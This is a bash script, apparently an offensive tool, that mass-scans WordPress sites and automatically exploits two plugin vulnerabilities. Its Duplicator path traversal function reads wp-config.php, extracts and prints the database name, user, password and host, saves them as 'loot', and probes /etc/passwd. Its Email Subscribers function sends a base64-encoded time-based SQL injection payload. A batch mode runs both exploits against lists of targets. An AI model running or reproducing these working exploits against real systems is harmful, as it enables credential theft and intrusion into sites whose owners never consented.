#!/bin/bash
# ============================================================
# WP-VULN-SCANNER — WordPress Plugin Exploit Scanner
# ============================================================
# Scans targets for vulnerable WordPress plugins and
# automatically exploits confirmed vulnerabilities.
#
# Currently supports:
#   1. Duplicator < 1.3.28  (CVE-2020-11738 — Path Traversal)
#   2. Email Subscribers < 5.7.15 (CVE-2024-2876 — Blind SQLi)
#
# Usage:
#   ./wp-vuln-scanner.sh -u http://target.com
#   ./wp-vuln-scanner.sh -l targets.txt
#   ./wp-vuln-scanner.sh -u http://target.com --scan-only
#   ./wp-vuln-scanner.sh -u http://target.com --exploit-all
#
# ⚠️  AUTHORIZED TARGETS ONLY. Unauthorized use is illegal.
# ============================================================

# ─── COLORS ───
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PINK='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m' # No Color

# ─── DEFAULTS ───
TIMEOUT=10
SCAN_ONLY=false
EXPLOIT_ALL=false
OUTPUT_DIR="./wp-scan-results"
SLEEP_TIME=3
TARGETS=()
SINGLE_URL=""
LIST_FILE=""
VERBOSE=false

# ─── HELP ───
show_help() {
    echo -e "${BOLD}WP-VULN-SCANNER${NC} — WordPress Plugin Exploit Scanner"
    echo ""
    echo -e "${CYAN}Usage:${NC}"
    echo "  $0 -u <url>              Scan a single target"
    echo "  $0 -l <file>             Scan targets from a file (one URL per line)"
    echo ""
    echo -e "${CYAN}Options:${NC}"
    echo "  -u, --url <url>          Target URL (include http/https)"
    echo "  -l, --list <file>        File with target URLs (one per line)"
    echo "  -o, --output <dir>       Output directory (default: ./wp-scan-results)"
    echo "  -t, --timeout <sec>      Request timeout in seconds (default: 10)"
    echo "  --scan-only              Only scan for vulns, don't exploit"
    echo "  --exploit-all            Auto-exploit all confirmed vulns"
    echo "  --sleep <sec>            SLEEP time for blind SQLi (default: 3)"
    echo "  -v, --verbose            Show detailed output"
    echo "  -h, --help               Show this help"
    echo ""
    echo -e "${RED}⚠️  AUTHORIZED TARGETS ONLY. Unauthorized access is a crime.${NC}"
    echo ""
    echo -e "${CYAN}Examples:${NC}"
    echo "  $0 -u http://localhost:8080                    # Scan your lab"
    echo "  $0 -u http://localhost:8080 --exploit-all      # Scan + auto-exploit"
    echo "  $0 -l targets.txt --scan-only                  # Mass scan, no exploit"
    echo "  $0 -l targets.txt --exploit-all -o ./loot      # Mass scan + exploit + save"
    echo ""
    echo -e "${CYAN}Supported Exploits:${NC}"
    echo "  CVE-2020-11738  Duplicator < 1.3.28       Path Traversal (file read)"
    echo "  CVE-2024-2876   Email Subscribers < 5.7.15 Blind Time-Based SQLi"
}

# ─── PARSE ARGS ───
while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url) SINGLE_URL="$2"; shift 2 ;;
        -l|--list) LIST_FILE="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -t|--timeout) TIMEOUT="$2"; shift 2 ;;
        --scan-only) SCAN_ONLY=true; shift ;;
        --exploit-all) EXPLOIT_ALL=true; shift ;;
        --sleep) SLEEP_TIME="$2"; shift 2 ;;
        -v|--verbose) VERBOSE=true; shift ;;
        -h|--help) show_help; exit 0 ;;
        *) echo -e "${RED}Unknown option: $1${NC}"; show_help; exit 1 ;;
    esac
done

# ─── VALIDATE INPUT ───
if [[ -z "$SINGLE_URL" && -z "$LIST_FILE" ]]; then
    echo -e "${RED}Error: Provide -u <url> or -l <file>${NC}"
    echo ""
    show_help
    exit 1
fi

if [[ -n "$LIST_FILE" && ! -f "$LIST_FILE" ]]; then
    echo -e "${RED}Error: File not found: $LIST_FILE${NC}"
    exit 1
fi

# Build target list
if [[ -n "$SINGLE_URL" ]]; then
    TARGETS+=("$SINGLE_URL")
fi
if [[ -n "$LIST_FILE" ]]; then
    while IFS= read -r line; do
        [[ -n "$line" && ! "$line" =~ ^# ]] && TARGETS+=("$line")
    done < "$LIST_FILE"
fi

if [[ ${#TARGETS[@]} -eq 0 ]]; then
    echo -e "${RED}Error: No targets found${NC}"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# ─── BANNER ───
echo ""
echo -e "${BOLD}${CYAN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${CYAN}║   WP-VULN-SCANNER — WordPress Exploit Scanner        ║${NC}"
echo -e "${BOLD}${CYAN}║   CVE-2020-11738 (Duplicator) + CVE-2024-2876 (ES)   ║${NC}"
echo -e "${BOLD}${CYAN}╚═══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${DIM}Targets: ${#TARGETS[@]} | Timeout: ${TIMEOUT}s | Output: ${OUTPUT_DIR}${NC}"
echo -e "${DIM}Mode: $(if $SCAN_ONLY; then echo "SCAN ONLY"; elif $EXPLOIT_ALL; then echo "SCAN + AUTO-EXPLOIT"; else echo "SCAN + PROMPT"; fi)${NC}"
echo ""
echo -e "${RED}⚠️  Authorized targets only. You are responsible for your actions.${NC}"
echo ""

# ─── UTILITY FUNCTIONS ───

# Strip trailing slash from URL
clean_url() {
    echo "$1" | sed 's|/$||'
}

# Compare versions: returns 0 if $1 < $2
version_lt() {
    [ "$(printf '%s\n' "$1" "$2" | sort -V | head -n1)" = "$1" ] && [ "$1" != "$2" ]
}

log_verbose() {
    if $VERBOSE; then
        echo -e "${DIM}  [v] $1${NC}"
    fi
}

# ─── PHASE 1: WORDPRESS DETECTION ───

detect_wordpress() {
    local url=$(clean_url "$1")
    log_verbose "Checking if $url is WordPress..."
    
    # Method 1: Check for wp-login.php
    local status=$(curl -s -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" "$url/wp-login.php" 2>/dev/null)
    if [[ "$status" == "200" || "$status" == "302" ]]; then
        return 0
    fi
    
    # Method 2: Check for wp-json
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" "$url/wp-json/" 2>/dev/null)
    if [[ "$status" == "200" ]]; then
        return 0
    fi
    
    # Method 3: Check HTML for wp-content
    local body=$(curl -s --max-time "$TIMEOUT" "$url" 2>/dev/null | head -100)
    if echo "$body" | grep -qi "wp-content"; then
        return 0
    fi
    
    return 1
}

# ─── PHASE 2: PLUGIN VERSION DETECTION ───

get_plugin_version() {
    local url=$(clean_url "$1")
    local plugin="$2"
    
    local readme=$(curl -s --max-time "$TIMEOUT" "$url/wp-content/plugins/$plugin/readme.txt" 2>/dev/null)
    
    if [[ -z "$readme" ]]; then
        echo ""
        return
    fi
    
    local version=$(echo "$readme" | grep -i "stable tag" | head -1 | sed 's/.*: //' | tr -d '\r\n ')
    echo "$version"
}

# ─── PHASE 3: DUPLICATOR EXPLOIT (CVE-2020-11738) ───

exploit_duplicator() {
    local url=$(clean_url "$1")
    local target_file="../wp-config.php"
    
    echo -e "  ${PINK}[EXPLOIT]${NC} Attempting Duplicator path traversal..."
    
    local response=$(curl -s --max-time "$TIMEOUT" \
        "$url/wp-admin/admin-ajax.php?action=duplicator_download&file=$target_file" 2>/dev/null)
    
    if echo "$response" | grep -q "DB_NAME\|DB_USER\|DB_PASSWORD\|AUTH_KEY"; then
        echo -e "  ${RED}${BOLD}[CRITICAL]${NC} ${RED}wp-config.php STOLEN!${NC}"
        
        # Save the loot
        local safe_name=$(echo "$url" | sed 's|https\?://||;s|[/:]|_|g')
        local loot_file="$OUTPUT_DIR/${safe_name}_wp-config.txt"
        echo "$response" > "$loot_file"
        echo -e "  ${DIM}Saved to: $loot_file${NC}"
        
        # Extract key info
        local db_name=$(echo "$response" | grep "DB_NAME" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_user=$(echo "$response" | grep "DB_USER" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_pass=$(echo "$response" | grep "DB_PASSWORD" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_host=$(echo "$response" | grep "DB_HOST" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        
        echo -e "  ${YELLOW}DB Name:${NC} $db_name"
        echo -e "  ${YELLOW}DB User:${NC} $db_user"
        echo -e "  ${YELLOW}DB Pass:${NC} $db_pass"
        echo -e "  ${YELLOW}DB Host:${NC} $db_host"
        
        # Try additional files
        echo -e "  ${PINK}[EXTRA]${NC} Probing additional files..."
        
        local extra_files=(
            "../../../../etc/passwd"
            "../../../../etc/hostname"
            "../../../../etc/os-release"
            "../.htaccess"
            "../wp-includes/version.php"
        )
        
        for ef in "${extra_files[@]}"; do
            local ef_resp=$(curl -s --max-time "$TIMEOUT" \
                "$url/wp-admin/admin-ajax.php?action=duplicator_download&file=$ef" 2>/dev/null | head -1)
            if [[ -n "$ef_resp" && "$ef_resp" != "Invalid installer file name!!" ]]; then
                local ef_name=$(echo "$ef" | sed 's|.*/||')
                echo -e "    ${GREEN}✓${NC} $ef → ${DIM}${ef_resp:0:60}...${NC}"
            fi
        done
        
        return 0
    else
        echo -e "  ${YELLOW}[INFO]${NC} Endpoint exists but no config data returned"
        log_verbose "Response: ${response:0:100}"
        return 1
    fi
}

# ─── PHASE 4: EMAIL SUBSCRIBERS SQLi (CVE-2024-2876) ───

exploit_email_subscribers() {
    local url=$(clean_url "$1")
    
    echo -e "  ${PINK}[EXPLOIT]${NC} Testing Email Subscribers blind SQLi..."
    echo -e "  ${DIM}This is a time-based test. SLEEP($SLEEP_TIME) injected.${NC}"
    
    # Step 1: Try to subscribe a test contact to get valid contact data
    log_verbose "Subscribing test contact to get valid data..."
    
    local test_email="wpvulnscan_$(date +%s)@test.local"
    
    # First, we need to find valid list hashes
    # Try common approach — subscribe via the form
    local sub_response=$(curl -s --max-time "$TIMEOUT" "$url/" \
        -X POST \
        -d "es=subscribe&esfpx_email=$test_email&esfpx_name=scanner&esfpx_es-subscribe=none&esfpx_form_id=1&esfpx_lists[]=1" 2>/dev/null)
    
    # Step 2: Try to enumerate existing contacts via timing
    # Build a generic SQLi payload that tests if the wp_users table has an admin
    local sqli_payload="1) OR (SELECT SLEEP($SLEEP_TIME) FROM wp_users WHERE user_login=0x61646d696e LIMIT 1)-- -"
    
    # We need a valid contact for the hash. Try contact_id 1-5 with common emails
    local confirmed=false
    
    for cid in 1 2 3; do
        # Build the JSON payload with SQLi in list_ids
        local json="{\"contact_id\":\"$cid\",\"email\":\"$test_email\",\"guid\":\"test\",\"message_id\":\"0\",\"campaign_id\":\"0\",\"list_ids\":\"$sqli_payload\"}"
        local hash=$(echo -n "$json" | base64 -w 0)
        
        log_verbose "Testing contact_id=$cid..."
        
        # Measure response time
        local start=$(date +%s%N)
        curl -s -o /dev/null --max-time 30 "$url/?es=optin&hash=$hash" 2>/dev/null
        local end=$(date +%s%N)
        
        local elapsed=$(( (end - start) / 1000000 )) # milliseconds
        local elapsed_sec=$((elapsed / 1000))
        
        log_verbose "Response time: ${elapsed}ms"
        
        # If response time > SLEEP_TIME seconds, SQLi confirmed
        if [[ $elapsed_sec -ge $SLEEP_TIME ]]; then
            confirmed=true
            echo -e "  ${RED}${BOLD}[CRITICAL]${NC} ${RED}Blind SQLi CONFIRMED!${NC}"
            echo -e "  ${YELLOW}Response time:${NC} ${elapsed}ms (expected ≥${SLEEP_TIME}000ms)"
            echo -e "  ${YELLOW}Contact ID used:${NC} $cid"
            echo -e "  ${YELLOW}Admin user:${NC} EXISTS (user_login='admin' confirmed via SLEEP)"
            
            # Save findings
            local safe_name=$(echo "$url" | sed 's|https\?://||;s|[/:]|_|g')
            local finding_file="$OUTPUT_DIR/${safe_name}_sqli-finding.txt"
            
            cat > "$finding_file" << FINDING
=== CVE-2024-2876 — Email Subscribers Blind SQLi ===
Target: $url
Date: $(date)
Plugin: Email Subscribers <= 5.7.14
Contact ID: $cid
Response Time: ${elapsed}ms (SLEEP=$SLEEP_TIME confirmed)
Admin User: EXISTS

Payload used:
  hash = base64(json({"list_ids":"$sqli_payload"}))

Proof:
  Normal response: ~100ms
  Injected response: ${elapsed}ms (${elapsed_sec}x normal)

Remediation:
  Update Email Subscribers to >= 5.7.15
  Or apply: array_map('absint', \$list_ids) before SQL query
FINDING
            
            echo -e "  ${DIM}Report saved to: $finding_file${NC}"
            break
        fi
    done
    
    if ! $confirmed; then
        echo -e "  ${YELLOW}[INFO]${NC} SQLi test inconclusive — may need valid contact data"
        echo -e "  ${DIM}The plugin is vulnerable by version, but exploitation requires a valid contact_id + email.${NC}"
        echo -e "  ${DIM}Try subscribing an email first, then check the database for contact details.${NC}"
        return 1
    fi
    
    return 0
}

# ─── MAIN SCAN LOOP ───

total=${#TARGETS[@]}
vuln_count=0
wp_count=0
scan_count=0

echo -e "${BOLD}Starting scan of $total target(s)...${NC}"
echo ""

for target in "${TARGETS[@]}"; do
    scan_count=$((scan_count + 1))
    target=$(clean_url "$target")
    
    echo -e "${BOLD}[${scan_count}/${total}]${NC} ${CYAN}$target${NC}"
    
    # ── Step 1: Is it WordPress? ──
    if ! detect_wordpress "$target"; then
        echo -e "  ${DIM}Not WordPress. Skipping.${NC}"
        echo ""
        continue
    fi
    
    echo -e "  ${GREEN}✓${NC} WordPress detected"
    wp_count=$((wp_count + 1))
    
    # ── Step 2: Check Duplicator ──
    dup_version=$(get_plugin_version "$target" "duplicator")
    if [[ -n "$dup_version" ]]; then
        echo -e "  ${GREEN}✓${NC} Duplicator found: ${BOLD}v${dup_version}${NC}"
        
        if version_lt "$dup_version" "1.3.28"; then
            echo -e "  ${RED}${BOLD}[VULN]${NC} ${RED}Duplicator $dup_version < 1.3.28 — CVE-2020-11738${NC}"
            vuln_count=$((vuln_count + 1))
            
            if ! $SCAN_ONLY; then
                if $EXPLOIT_ALL; then
                    exploit_duplicator "$target"
                else
                    echo -en "  ${YELLOW}Exploit? [y/N]:${NC} "
                    read -r answer
                    if [[ "$answer" =~ ^[Yy] ]]; then
                        exploit_duplicator "$target"
                    fi
                fi
            fi
        else
            echo -e "  ${GREEN}✓${NC} Duplicator $dup_version — ${GREEN}PATCHED${NC}"
        fi
    else
        log_verbose "Duplicator not found"
    fi
    
    # ── Step 3: Check Email Subscribers ──
    es_version=$(get_plugin_version "$target" "email-subscribers")
    if [[ -n "$es_version" ]]; then
        echo -e "  ${GREEN}✓${NC} Email Subscribers found: ${BOLD}v${es_version}${NC}"
        
        if version_lt "$es_version" "5.7.15"; then
            echo -e "  ${RED}${BOLD}[VULN]${NC} ${RED}Email Subscribers $es_version < 5.7.15 — CVE-2024-2876${NC}"
            vuln_count=$((vuln_count + 1))
            
            if ! $SCAN_ONLY; then
                if $EXPLOIT_ALL; then
                    exploit_email_subscribers "$target"
                else
                    echo -en "  ${YELLOW}Exploit? [y/N]:${NC} "
                    read -r answer
                    if [[ "$answer" =~ ^[Yy] ]]; then
                        exploit_email_subscribers "$target"
                    fi
                fi
            fi
        else
            echo -e "  ${GREEN}✓${NC} Email Subscribers $es_version — ${GREEN}PATCHED${NC}"
        fi
    else
        log_verbose "Email Subscribers not found"
    fi
    
    # ── Step 4: Check other common vulnerable plugins ──
    # Contact Form 7
    cf7_version=$(get_plugin_version "$target" "contact-form-7")
    if [[ -n "$cf7_version" ]]; then
        echo -e "  ${GREEN}✓${NC} Contact Form 7: v${cf7_version}"
        if version_lt "$cf7_version" "5.3.2"; then
            echo -e "  ${RED}${BOLD}[VULN]${NC} ${RED}CF7 $cf7_version < 5.3.2 — CVE-2020-35489 (file upload)${NC}"
            vuln_count=$((vuln_count + 1))
        fi
    fi
    
    # Starter Templates / Astra Sites
    st_version=$(get_plugin_version "$target" "astra-sites")
    if [[ -n "$st_version" ]]; then
        echo -e "  ${GREEN}✓${NC} Starter Templates: v${st_version}"
        if version_lt "$st_version" "2.7.1"; then
            echo -e "  ${RED}${BOLD}[VULN]${NC} ${RED}Starter Templates $st_version < 2.7.1 — CVE-2022-29455 (XSS)${NC}"
            vuln_count=$((vuln_count + 1))
        fi
    fi
    
    # WP File Manager
    fm_version=$(get_plugin_version "$target" "wp-file-manager")
    if [[ -n "$fm_version" ]]; then
        echo -e "  ${GREEN}✓${NC} WP File Manager: v${fm_version}"
        if version_lt "$fm_version" "6.9"; then
            echo -e "  ${RED}${BOLD}[VULN]${NC} ${RED}WP File Manager $fm_version < 6.9 — CVE-2020-25213 (RCE)${NC}"
            vuln_count=$((vuln_count + 1))
        fi
    fi
    
    echo ""
done

# ─── SUMMARY ───

echo -e "${BOLD}${CYAN}════════════════════════════════════════${NC}"
echo -e "${BOLD}SCAN COMPLETE${NC}"
echo -e "${CYAN}════════════════════════════════════════${NC}"
echo ""
echo -e "  Targets scanned:    ${BOLD}$total${NC}"
echo -e "  WordPress found:    ${BOLD}$wp_count${NC}"
echo -e "  Vulnerabilities:    ${RED}${BOLD}$vuln_count${NC}"
echo -e "  Results saved to:   ${DIM}$OUTPUT_DIR/${NC}"
echo ""

if [[ $vuln_count -gt 0 ]]; then
    echo -e "${RED}${BOLD}⚠️  $vuln_count vulnerability(s) found. See results in $OUTPUT_DIR/${NC}"
else
    echo -e "${GREEN}${BOLD}✓ No known vulnerabilities found.${NC}"
fi

echo ""
echo -e "${DIM}WP-VULN-SCANNER by k3njaku — use responsibly ☕${NC}"
